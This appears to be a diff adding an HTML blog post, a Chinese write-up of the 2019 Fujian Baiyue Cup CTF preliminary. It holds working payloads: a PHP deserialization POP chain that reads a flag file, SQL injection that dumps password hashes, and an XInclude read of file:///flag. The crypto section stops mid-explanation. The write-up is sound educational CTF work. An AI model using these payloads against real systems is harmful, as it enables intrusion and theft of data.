@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="垃圾比赛，原题五连击加一题PWN改。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解">
+<meta property="og:url" content="https://southsea.st/2019-BYB-Preliminary/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="垃圾比赛，原题五连击加一题PWN改。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-11-10T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.068Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Misc">
+<meta property="article:tag" content="Reserve">
+<meta property="article:tag" content="Crypto">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/2019-BYB-Preliminary/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/2019-BYB-Preliminary/","path":"2019-BYB-Preliminary/","title":"2019 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2019 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#babyphp"><span class="nav-number">1.1.</span> <span class="nav-text">babyphp</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#babygame"><span class="nav-number">1.2.</span> <span class="nav-text">babygame</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#math"><span class="nav-number">2.1.</span> <span class="nav-text">math</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#misc"><span class="nav-number">3.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">3.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#key"><span class="nav-number">3.2.</span> <span class="nav-text">key</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%93%88%E5%B0%94%E7%9A%84%E7%A7%BB%E5%8A%A8%E5%9F%8E%E5%A0%A1"><span class="nav-number">3.3.</span> <span class="nav-text">哈尔的移动城堡</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#wireless"><span class="nav-number">3.4.</span> <span class="nav-text">WireLess</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reverse"><span class="nav-number">4.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#shy"><span class="nav-number">4.1.</span> <span class="nav-text">shy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#md5"><span class="nav-number">4.2.</span> <span class="nav-text">md5</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bwarm"><span class="nav-number">4.3.</span> <span class="nav-text">bwarm</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/2019-BYB-Preliminary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2019 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2019 福建省高校网络空间安全大赛 百越杯 线上初赛 部分题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-11-10 00:00:00" itemprop="dateCreated datePublished" datetime="2019-11-10T00:00:00+00:00">2019-11-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">题解</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>垃圾比赛，原题五连击加一题<strong>PWN</strong>改。</p>
+<span id="more"></span>
+<h3 id="web">Web</h3>
+<h4 id="babyphp">babyphp</h4>
+<p>京津冀大学生竞赛原题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source . <span class="string">&#x27;解析开始&#x27;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|fllllllaaaaaag/i&#x27;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$chal</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chal&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>POP</strong>链的终点是<strong>Read</strong>类中的**__invoke()**函数，触发条件是对象尝试被以函数的方式调用的时候。</p>
+<p>那么应该是选择<strong>Test</strong>类中的**__get()<strong>函数来触发，而</strong>__get()**当访问不存在的成员变量时会被触发。</p>
+<p>这时看<strong>Show</strong>类，**__toString()<strong>函数访问了</strong>$str<strong>数组中</strong>str<strong>对应的值中的</strong>source<strong>变量，恰好</strong>Test<strong>类中无</strong>source<strong>变量，可以调用</strong>Test<strong>类中的</strong>__get()**函数。</p>
+<p>而当**__construct()<strong>函数中的</strong>echo<strong>函数将对象当做变量调用时，会触发</strong>Show<strong>类中的</strong>__toString()**函数。</p>
+<p>至此，<strong>POP</strong>链形成。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&#x27;fllllllaaaaaag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;params = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;str = <span class="keyword">array</span>(<span class="string">&#x27;str&#x27;</span>=&gt;<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$d</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ?chal=O%3A4%3A&quot;Show&quot;%3A2%3A%7Bs%3A6%3A&quot;source&quot;%3BO%3A4%3A&quot;Show&quot;%3A2%3A%7Bs%3A6%3A&quot;source&quot;%3Bs%3A9%3A&quot;index.php&quot;%3Bs%3A3%3A&quot;str&quot;%3Ba%3A1%3A%7Bs%3A3%3A&quot;str&quot;%3BO%3A4%3A&quot;Test&quot;%3A1%3A%7Bs%3A6%3A&quot;params&quot;%3BO%3A4%3A&quot;Read&quot;%3A1%3A%7Bs%3A9%3A&quot;%00Read%00var&quot;%3Bs%3A18%3A&quot;fllllllaaaaaag.php&quot;%3B%7D%7D%7D%7Ds%3A3%3A&quot;str&quot;%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>
+<h4 id="babygame">babygame</h4>
+<p>一道二次注入，注册处利用查询的用户名截取一定长度来可以进行引号逃逸。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 注册用户名</span><br><span class="line">south\\\\\\\\\\\\\&#x27;</span><br><span class="line"># 插入数据库</span><br><span class="line">south\\\\\\\\\\\\\\\\\\\\\\\\\\\&#x27;</span><br><span class="line"># 取出用户查询的用户名</span><br><span class="line">south\\\\\\\\\\\\\\\\\\\\\\\\\</span><br></pre></td></tr></table></figure>
+<p>进去后到了<strong>/manage.php?msgid=1</strong>页面。</p>
+<p>猜测此处<strong>sql</strong>查询语句如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password from user where username=&#x27;&#x27; and msgid=&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+<p>那么此时查询语句应该为。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select password from user where username=&#x27;south\\\\\\\\\\\\\\\\\\\\\\\\\&#x27; and msgid=&#x27;&#x27;;</span><br></pre></td></tr></table></figure>
+<p>尝试构造。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/manage.php?msgid=union select 1,2,3,4 from users #</span><br></pre></td></tr></table></figure>
+<p>回显为<strong>3</strong>，确认有效，最后构造。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/manage.php?msgid=union select 1,2,group_concat(password),4 from users #</span><br></pre></td></tr></table></figure>
+<p>得到<strong>251471f34244cb6cd61f6b64c63f7b1a</strong>，去<strong>tools.php</strong>下查询得到<strong>ChunQiuGame</strong>。</p>
+<p>登陆<strong>admin</strong>后提示<strong>xxe</strong>，但是无法读取外部实体，可以使用<strong>xinclude</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content=%3Croot%20xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%0A%20%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fflag%22%20parse%3D%22text%22%2F%3E%0A%3C%2Froot%3E</span><br><span class="line"># flag&#123;f784a3cc-d53f-4440-9456-f050e6ac67e0&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="crypto">Crypto</h3>
+<h4 id="math">math</h4>
+<p>源码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag = s2n(flag)</span><br><span class="line">a = getRandomRange(<span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">499</span>), <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>))</span><br><span class="line">b = getRandomRange(<span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">499</span>), <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>))</span><br><span class="line">p = a * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + b</span><br><span class="line">q = b * <span class="built_in">pow</span>(<span class="number">10</span>, <span class="number">500</span>) + a</span><br><span class="line"><span class="built_in">print</span> p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = getRandomInteger(<span class="number">100</span>)</span><br><span class="line">p = next_prime(p + c)</span><br><span class="line">q = next_prime(q + c)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> n</span><br><span class="line">flag = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
+<p>考数学，将<strong>pow(10,
+500)</strong>设为常数<strong>s</strong>，得到公式<strong>p * q = a * b *
+s ² + (a ² + b ²)* s + a * b</strong>。</p>
+<p><strong>a *
+b</strong>的部分在<strong>pq</strong>的<strong>[:1000]</strong>和<strong>[:1000]</strong>，中间<strong>a
+² + b
+²</strong>的部分在<strong>pq</strong>的<strong>[500:1500]</strong>。</p>
+<p>因此恰有<strong>pq[:500]</strong>和<strong>pq[1500:]</strong>未被污染，分别单独属于<strong>a
+* b</strong>的前半部分和后半部分。</p>
